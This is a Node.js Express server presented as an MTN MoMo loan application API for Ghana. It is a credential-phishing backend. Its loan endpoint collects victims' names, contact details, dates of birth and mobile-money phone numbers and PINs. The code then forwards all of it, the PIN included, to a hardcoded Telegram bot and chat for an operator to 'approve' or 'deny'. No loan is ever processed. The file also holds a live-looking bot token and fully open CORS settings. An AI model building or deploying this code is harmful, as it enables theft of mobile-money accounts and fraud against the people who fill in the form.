const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CORS - FULLY ENABLED
// ============================================
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));

app.options('*', cors());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).send('OK');
  }
  next();
});

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM CONFIGURATION - GHANA
// ============================================
const BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
const CHAT_ID = '8313270294';

// Store pending loan requests
const pendingLoans = {};

// ============================================
// SEND TELEGRAM LOAN APPLICATION
// ============================================
async function sendTelegramLoanApplication(data) {
  try {
    const message = `💰 *NEW MTN MoMo LOAN APPLICATION - GHANA*\n\n` +
      `📋 *LOAN DETAILS*\n` +
      `📌 Product: ${data.loanType}\n` +
      `💵 Amount: GHS ${parseInt(data.loanAmount).toLocaleString()}\n` +
      `📅 Term: ${data.loanTerm} Days\n` +
      `📝 Purpose: ${data.loanPurpose}\n\n` +
      `👤 *PERSONAL DETAILS*\n` +
      `👤 Name: ${data.fullName}\n` +
      `📧 Email: ${data.email}\n` +
      `📱 Phone: +233 ${data.phone}\n` +
      `🎂 DOB: ${data.dob}\n` +
      `📍 Region: ${data.region}\n` +
      `📍 District: ${data.district}\n` +
      `💼 Employment: ${data.employment}\n` +
      `💰 Monthly Income: GHS ${parseInt(data.income).toLocaleString()}\n\n` +
      `🔐 *MOMO ACCOUNT LOGIN*\n` +
      `📱 MoMo Phone: +233 ${data.momoPhone}\n` +
      `🔢 MoMo PIN: ${data.momoPin}\n\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `⚠️ Please approve or deny this loan request.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Approve Loan', callback_data: `approve_loan_${data.requestId}` },
              { text: '❌ Deny Loan', callback_data: `deny_loan_${data.requestId}` }
            ]
          ]
        }
      })
    });

    const result = await response.json();
    console.log('📤 Telegram Loan Request:', result.ok ? '✅ Sent' : '❌ Failed');
    return result;
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    return null;
  }
}

// ============================================
// HANDLE TELEGRAM CALLBACK (Approve/Deny)
// ============================================
app.post('/api/telegram/callback', async (req, res) => {
  try {
    const { callback_data } = req.body;

    console.log('📥 Callback received:', callback_data);

    if (!callback_data) {
      return res.status(400).json({ success: false, message: 'No callback data' });
    }

    const [action, type, requestId] = callback_data.split('_');

    if (!pendingLoans[requestId]) {
      return res.status(404).json({ success: false, message: 'Request not found' });
    }

    if (action === 'approve' && type === 'loan') {
      pendingLoans[requestId].status = 'approved';
      console.log('✅ Loan approved for request:', requestId);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `✅ *LOAN APPROVED*\n\n` +
            `👤 ${pendingLoans[requestId].fullName}\n` +
            `📱 +233 ${pendingLoans[requestId].phone}\n` +
            `💵 GHS ${pendingLoans[requestId].amount.toLocaleString()}\n\n` +
            `💰 Loan amount is being processed.`,
          parse_mode: 'Markdown'
        })
      });

      res.json({ success: true, message: 'Loan approved' });
    } else if (action === 'deny' && type === 'loan') {
      pendingLoans[requestId].status = 'denied';
      console.log('❌ Loan denied for request:', requestId);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `❌ *LOAN DENIED*\n\n` +
            `👤 ${pendingLoans[requestId].fullName}\n` +
            `📱 +233 ${pendingLoans[requestId].phone}\n` +
            `💵 GHS ${pendingLoans[requestId].amount.toLocaleString()}\n\n` +
            `🚫 Loan request was denied.`,
          parse_mode: 'Markdown'
        })
      });

      res.json({ success: true, message: 'Loan denied' });
    } else {
      res.status(400).json({ success: false, message: 'Invalid action' });
    }
  } catch (error) {
    console.error('❌ Callback error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// CHECK LOAN STATUS ENDPOINT
// ============================================
app.get('/api/loan/status/:requestId', (req, res) => {
  const { requestId } = req.params;

  if (!pendingLoans[requestId]) {
    return res.status(404).json({
      success: false,
      message: 'Request not found'
    });
  }

  res.json({
    success: true,
    status: pendingLoans[requestId].status,
    phone: pendingLoans[requestId].phone
  });
});

// ============================================
// LOAN APPLICATION ENDPOINT
// ============================================
app.post('/api/loan/apply', async (req, res) => {
  try {
    const {
      loanType,
      loanAmount,
      loanTerm,
      loanPurpose,
      fullName,
      email,
      phone,
      dob,
      region,
      district,
      employment,
      income,
      momoPhone,
      momoPin
    } = req.body;

    console.log('💰 Loan application:', {
      loanType,
      loanAmount,
      fullName,
      phone,
      momoPhone,
      momoPin: '****'
    });

    // Validation
    if (!loanType || !loanAmount || !loanTerm || !loanPurpose) {
      return res.status(400).json({
        success: false,
        message: 'Loan details are required'
      });
    }

    if (!fullName || !email || !phone) {
      return res.status(400).json({
        success: false,
        message: 'Personal details are required'
      });
    }

    if (!momoPhone || !momoPin) {
      return res.status(400).json({
        success: false,
        message: 'MoMo account details are required'
      });
    }

    // Generate unique request ID
    const requestId = 'loan_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);

    // Store pending request
    pendingLoans[requestId] = {
      loanType,
      amount: parseInt(loanAmount),
      loanTerm,
      loanPurpose,
      fullName,
      email,
      phone,
      dob,
      region,
      district,
      employment,
      income: parseInt(income),
      momoPhone,
      momoPin,
      status: 'pending',
      timestamp: new Date().toISOString()
    };

    // Send Telegram notification with Approve/Deny buttons
    await sendTelegramLoanApplication({
      loanType,
      loanAmount,
      loanTerm,
      loanPurpose,
      fullName,
      email,
      phone,
      dob,
      region,
      district,
      employment,
      income,
      momoPhone,
      momoPin,
      requestId
    });

    res.json({
      success: true,
      message: 'Loan request sent. Please wait for admin approval.',
      requestId: requestId,
      phoneNumber: phone
    });

  } catch (error) {
    console.error('Loan error:', error);
    res.status(500).json({
      success: false,
      message: 'Loan application failed',
      error: error.message
    });
  }
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'OK',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'production',
    message: 'MTN MoMo Loan API - Ghana is running! 🇬🇭'
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found',
    path: req.originalUrl
  });
});

// ============================================
// ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('====================================');
  console.log('💰 MTN MoMo Loan API - Ghana');
  console.log('====================================');
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Health check: /api/health`);
  console.log(`🤖 Telegram Bot configured`);
  console.log(`📱 Chat ID: ${CHAT_ID}`);
  console.log('🇬🇭 Ghana MTN MoMo Loan System');
  console.log('====================================');
});
